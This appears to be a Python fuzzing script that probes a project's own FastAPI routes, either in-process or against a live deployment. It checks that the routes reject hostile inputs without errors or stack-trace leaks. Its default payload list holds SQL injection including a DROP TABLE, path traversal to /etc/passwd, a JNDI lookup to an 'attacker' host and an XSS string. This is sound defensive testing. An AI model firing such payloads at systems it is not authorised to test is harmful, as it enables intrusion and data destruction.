#!/usr/bin/env python3
"""fuzz-api-routes.py — SLAAT-P1-2 standalone adversarial payload fuzzer.

Ad-hoc companion to the pytest suites in
``d2-signalloom/apps/fe-signalloom/src/tests/`` (which are the primary,
CI-reproducible evidence for this card). This script exists for the
Required-Tests-literal invocation shape (``python3 scripts/fuzz-api-routes.py
--target URL --dictionary FILE``) and for quick manual re-probing without
spinning up pytest.

Two modes:

* **In-process (default, no ``--target``):** mounts the real FastAPI app
  in-memory via ``fastapi.testclient.TestClient``, with the same JWT/pool
  fixture-mode wiring the pytest suites use. Safe to run anywhere, no live
  dependency.
* **Live (``--target URL``):** sends the same payload battery at a real,
  already-running fe-signalloom instance (e.g. the kind-osramp deployment via
  ``scripts/probe-api-idor-boundaries.sh``'s port-forward). No auth token is
  supplied in live mode, since minting one requires a real Dex OIDC flow;
  every probe therefore expects 401, and a 500 or a 2xx is reported as a
  finding.

Dictionary file (``--dictionary``, one payload per line) defaults to the
built-in SQLi/traversal/overflow battery if not given; ``security/payloads.txt``
named in the card does not exist in this repo (no pre-existing ``security/``
directory) and is not fabricated here.

Output: JSON report to stdout, exit 0 if every probe resolved as expected
(401/403/404/422, never 500, never a leak), exit 1 otherwise.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from typing import Any

_FE_SIGNALLOOM_SRC = Path(__file__).resolve().parents[1] / "d2-signalloom/apps/fe-signalloom/src"
if str(_FE_SIGNALLOOM_SRC) not in sys.path:
    sys.path.insert(0, str(_FE_SIGNALLOOM_SRC))

DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE agent_registry; --",
    '" OR 1=1 --',
    "' UNION SELECT NULL,NULL,NULL--",
    "../../../etc/passwd",
    "A" * 100_000,
    "${jndi:ldap://attacker/x}",
    "<script>alert(1)</script>",
]

ROUTES = [
    ("POST", "/api/v1/connectors", lambda p: {"provider_id": p}),
    ("POST", "/api/v1/agents/{probe}/transition", lambda p: {"to_state": "governed", "reason": p}),
    ("POST", "/api/v1/discovery/claim", lambda p: {"agent_id": p}),
    ("POST", "/api/v1/external-agents/registrations", lambda p: {"agent_id": p, "host_id": "fuzz-host"}),
]

LEAK_SUBSTRINGS = ("Traceback", "asyncpg", "psycopg", 'File "', "  at ")


def _load_payloads(path: str | None) -> list[str]:
    if not path:
        return DEFAULT_PAYLOADS
    text = Path(path).read_text()
    lines = [line.rstrip("\n") for line in text.splitlines() if line.strip()]
    return lines or DEFAULT_PAYLOADS


def _in_process_client():
    import socket
    import time
    from types import SimpleNamespace

    import jwt
    from cryptography.hazmat.primitives.asymmetric import rsa
    from fastapi.testclient import TestClient

    import api_compat
    from api_compat import settings
    from db.connection import set_pool_for_testing
    from main import app

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    class _Jwk:
        def get_signing_key_from_jwt(self, token: str):
            if jwt.get_unverified_header(token).get("kid") != "fuzz-cli-key":
                raise jwt.PyJWKClientError("unknown test key")
            return SimpleNamespace(key=key.public_key())

    settings.api_jwt_issuer = "https://issuer.test/dex"
    settings.api_jwt_audience = "signalloom-api"
    settings.api_jwt_authorized_party = "signalloom-dashboard"
    settings.api_jwks_url = "https://issuer.test/keys"
    settings.api_subject_tenants = {"fuzz-cli-subject": "fuzz-cli-tenant"}
    api_compat._jwk_client = lambda _url: _Jwk()

    async def _no_pool():
        return None

    api_compat._get_pool = _no_pool
    orig_connect = socket.socket.connect

    def _reject_external(self, *a, **kw):
        raise AssertionError("no external network from the in-process fuzzer")

    socket.socket.connect = _reject_external

    class _ReadyPool:
        async def close(self):
            pass

    set_pool_for_testing(_ReadyPool())

    now = int(time.time())
    token = jwt.encode(
        {
            "iss": "https://issuer.test/dex", "aud": "signalloom-api",
            "iat": now, "nbf": now, "exp": now + 300,
            "azp": "signalloom-dashboard", "sub": "fuzz-cli-subject",
        },
        key, algorithm="RS256", headers={"kid": "fuzz-cli-key", "typ": "JWT"},
    )
    client = TestClient(app, raise_server_exceptions=False)
    client.__enter__()
    return client, {"Authorization": f"Bearer {token}"}


def run(target: str | None, dictionary: str | None) -> dict[str, Any]:
    payloads = _load_payloads(dictionary)
    results: list[dict[str, Any]] = []

    if target:
        import httpx

        http_client = httpx.Client(base_url=target.rstrip("/"), timeout=10.0)
        auth_headers: dict[str, str] = {}

        def request(method: str, path: str, body: dict[str, Any]) -> tuple[int, str]:
            resp = http_client.request(method, path, json=body, headers=auth_headers)
            return resp.status_code, resp.text
    else:
        client, auth_headers = _in_process_client()

        def request(method: str, path: str, body: dict[str, Any]) -> tuple[int, str]:
            resp = client.request(method, path, json=body, headers=auth_headers)
            return resp.status_code, resp.text

    expect_unauthenticated = target is not None  # live mode has no mintable Dex token

    for method, path_template, build_body in ROUTES:
        path = path_template.replace("{probe}", "fuzz-probe-id")
        for payload in payloads:
            body = build_body(payload)
            try:
                status, text = request(method, path, body)
            except Exception as exc:  # the fuzzer's own transport failing is itself a finding
                results.append(
                    {"method": method, "path": path, "payload": payload[:80], "status": None,
                     "verdict": "transport-error", "detail": str(exc)[:300]}
                )
                continue

            verdict = "fail"
            if expect_unauthenticated:
                verdict = "pass" if status == 401 else "fail"
            elif status in (200, 201, 400, 401, 403, 404, 409, 422):
                verdict = "pass"
            if status == 500:
                verdict = "fail-500"
            if any(needle in text for needle in LEAK_SUBSTRINGS):
                verdict = "fail-leak"

            results.append(
                {"method": method, "path": path, "payload": payload[:80], "status": status, "verdict": verdict}
            )

    failures = [r for r in results if r["verdict"] != "pass"]
    return {
        "mode": "live" if target else "in-process",
        "target": target,
        "total_probes": len(results),
        "failures": len(failures),
        "results": results,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=None, help="Base URL of a live fe-signalloom instance")
    parser.add_argument("--dictionary", default=None, help="Payload file, one per line")
    args = parser.parse_args()

    report = run(args.target, args.dictionary)
    print(json.dumps(report, indent=2))
    return 0 if report["failures"] == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
